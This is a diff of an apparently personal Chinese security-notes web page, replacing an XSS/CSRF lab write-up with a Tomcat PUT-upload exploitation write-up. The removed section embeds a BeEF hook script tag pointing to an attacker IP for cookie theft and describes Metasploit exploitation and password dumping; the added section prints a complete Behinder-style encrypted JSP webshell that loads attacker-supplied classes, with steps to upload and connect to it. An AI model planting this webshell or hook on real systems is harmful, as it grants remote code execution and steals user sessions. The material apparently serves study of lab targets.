@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../Vulnhub%20Tomato%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
+        <link rel="prev" href="../Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20%EF%BC%88CVE-2020-13933/">
       
       
-        <link rel="next" href="../XXE/">
+        <link rel="next" href="../Vulnhub%20Tomato%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>XSS漏洞利用 - 陈奕霖</title>
+        <title>Tomcat文件上传 - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#xss" class="md-skip">
+        <a href="#1" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              XSS漏洞利用
+              Tomcat文件上传
             
           </span>
         </div>
@@ -701,11 +701,62 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Tomcat文件上传
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Tomcat文件上传
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1、漏洞描述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    2、漏洞影响版本
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    3、漏洞复现
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -729,99 +780,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          XSS漏洞利用
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="md-nav__link">
         XSS漏洞利用
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、漏洞利用
-  </a>
-  
-    <nav class="md-nav" aria-label="一、漏洞利用">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1" class="md-nav__link">
-    1、工具
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2payload" class="md-nav__link">
-    2.构造攻击payload，并欺骗目标机器访问我们的代码
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pilachucsrf" class="md-nav__link">
-    二、更改pilachu账户信息（CSRF:跨站请求伪造）
-  </a>
-  
-    <nav class="md-nav" aria-label="二、更改pilachu账户信息（CSRF:跨站请求伪造）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1burpsuite" class="md-nav__link">
-    1）用BurpSuite
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2kalil" class="md-nav__link">
-    2）在kalil利用脚本对用户进行信息修改
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1018,8 +981,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -1028,56 +989,23 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、漏洞利用
-  </a>
-  
-    <nav class="md-nav" aria-label="一、漏洞利用">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#1" class="md-nav__link">
-    1、工具
+    1、漏洞描述
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2payload" class="md-nav__link">
-    2.构造攻击payload，并欺骗目标机器访问我们的代码
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#pilachucsrf" class="md-nav__link">
-    二、更改pilachu账户信息（CSRF:跨站请求伪造）
-  </a>
-  
-    <nav class="md-nav" aria-label="二、更改pilachu账户信息（CSRF:跨站请求伪造）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1burpsuite" class="md-nav__link">
-    1）用BurpSuite
+  <a href="#2" class="md-nav__link">
+    2、漏洞影响版本
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#2kalil" class="md-nav__link">
-    2）在kalil利用脚本对用户进行信息修改
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    3、漏洞复现
   </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1096,78 +1024,22 @@
                   
 
 
-<h1 id="xss">XSS漏洞利用</h1>
-<h3 id="_1">一、漏洞利用</h3>
-<h4 id="1">1、工具</h4>
-<p>apt-get install beef-xss  安装</p>
-<p>beef-xss  启动</p>
-<p>vim /usr/share/beef-xss/config.yaml 修改配置，密码等</p>
-<p>beef-xss-stop  关闭服务</p>
-<p><img alt="img" src="../Untitled.assets/wps39.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps40.jpg" /> </p>
-<h4 id="2payload">2.构造攻击payload，并欺骗目标机器访问我们的代码</h4>
-<script src="http://192.168.8.138:3000/hook.js"></script>
+  <h1>Tomcat文件上传</h1>
 
-<p><img alt="img" src="../Untitled.assets/wps41.jpg" /> </p>
-<p>Kali beef显示192.168.8.138</p>
-<p><img alt="img" src="../Untitled.assets/wps42.jpg" /> </p>
-<p>获取cookie信息</p>
-<p><img alt="img" src="../Untitled.assets/wps43.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps44.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps45.jpg" /> </p>
-<p>Kali 使用msfconsole</p>
-<p><img alt="img" src="../Untitled.assets/wps46.jpg" /> </p>
-<p>利用 MS12-063漏洞：</p>
-<p><img alt="img" src="../Untitled.assets/wps47.png" /><img alt="img" src="../Untitled.assets/wps48.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps49.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps50.jpg" /> </p>
-<p>无rhost为被动攻击</p>
-<p>设置srvport为9999</p>
-<p><img alt="img" src="../Untitled.assets/wps51.png" /><img alt="img" src="../Untitled.assets/wps52.png" /><img alt="img" src="../Untitled.assets/wps53.png" /><img alt="img" src="../Untitled.assets/wps54.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps55.jpg" /> </p>
-<p>攻击：</p>
-<p><img alt="img" src="../Untitled.assets/wps56.png" /><img alt="img" src="../Untitled.assets/wps57.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps58.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps59.jpg" /> </p>
-<p>获取权限：</p>
-<p><img alt="img" src="../Untitled.assets/wps60.jpg" /> </p>
-<p>获取密码</p>
-<p><img alt="img" src="../Untitled.assets/wps61.jpg" /> </p>
-<p>获取密钥</p>
-<p><img alt="img" src="../Untitled.assets/wps62.jpg" /> </p>
-<p>破解密码：</p>
-<p><img alt="img" src="../Untitled.assets/wps63.jpg" /> </p>
-<h3 id="pilachucsrf">二、更改pilachu账户信息（CSRF:跨站请求伪造）</h3>
-<h4 id="1burpsuite">1）用BurpSuite</h4>
-<p>1.打开登录pikachu用户界面，进入CSRF(get)</p>
-<p><img alt="img" src="../Untitled.assets/wps64.jpg" /> </p>
-<p>打开burp suite</p>
-<p>并打开代理</p>
-<p><img alt="img" src="../Untitled.assets/wps65.jpg" /> </p>
-<p>对登录页面，点击修改个人信息，修改信息开始抓包</p>
-<p><img alt="img" src="../Untitled.assets/wps66.jpg" /> </p>
-<p>将抓到的含有账户密码等信息发送到repeater</p>
-<p><img alt="img" src="../Untitled.assets/wps67.jpg" /> </p>
-<p>将用户信息在request中进行修改，并send</p>
-<p><img alt="img" src="../Untitled.assets/wps68.jpg" /> </p>
-<p>返回到pikachu页面刷新</p>
-<p><img alt="img" src="../Untitled.assets/wps69.jpg" /> </p>
-<p>信息已被修改</p>
-<h4 id="2kalil">2）在kalil利用脚本对用户进行信息修改</h4>
-<p>将脚本文件IP地址改为要攻击的主机地址，并放入kali var/www/html文件夹下</p>
-<p><img alt="img" src="../Untitled.assets/wps70.jpg" /> </p>
-<p><img alt="img" src="../Untitled.assets/wps71.jpg" /> </p>
-<p>打开卡里的apache服务</p>
-<p><img alt="img" src="../Untitled.assets/wps72.jpg" /> </p>
-<p>查看csrftest.php文件，红线框内为要将受害用户的信息更改的结果</p>
-<p><img alt="img" src="../Untitled.assets/wps73.png" /><img alt="img" src="../Untitled.assets/wps74.jpg" /> </p>
-<p>在受害机内点开192.168.8.138/csrftest.php（kali机IP）</p>
-<p><img alt="img" src="../Untitled.assets/wps75.jpg" /> </p>
-<p>访问此页面后返回pikachu信息界面进行刷新</p>
-<p><img alt="img" src="../Untitled.assets/wps76.jpg" /> </p>
-<p>信息已被修改。</p>
-<p>遇到问题：打开kali的Apache服务在受害机无法打开192.168.8.138/csrftest.php文件的页面，从而无法实现更改受害用户信息。</p>
-<p>解决方案：打开kali中var/www/html文件下脚本文件的最高权限</p>
+<h3 id="1">1、漏洞描述</h3>
+<p>Tomcat 是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法，攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。</p>
+<h3 id="2">2、漏洞影响版本</h3>
+<p><strong>Apache Tomcat 7.0.0 – 7.0.81</strong></p>
+<h3 id="3">3、漏洞复现</h3>
+<p>上传恶意代码</p>
+<div class="highlight"><pre><span></span><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;
+&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;/*åÆ¥:Þ¥Æ32Mmd5&lt;M16MØ¤Þ¥Ærebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
+</code></pre></div>
+<p>用burpsuite抓包，然后甩到Repeater</p>
+<p>重新构造数据包，数据包头更改GET类型为PUT，并增加POST 请求体，send构造好的数据包后，观察状态</p>
+<p><img alt="image_20230826150716" src="../Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image_20230826150716.png" /></p>
+<p>使用冰蝎访问url，连接访问，连接上线</p>
+<p><img alt="image-20230826151326705" src="../Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20230826151326705.png" /></p>
 
 
 
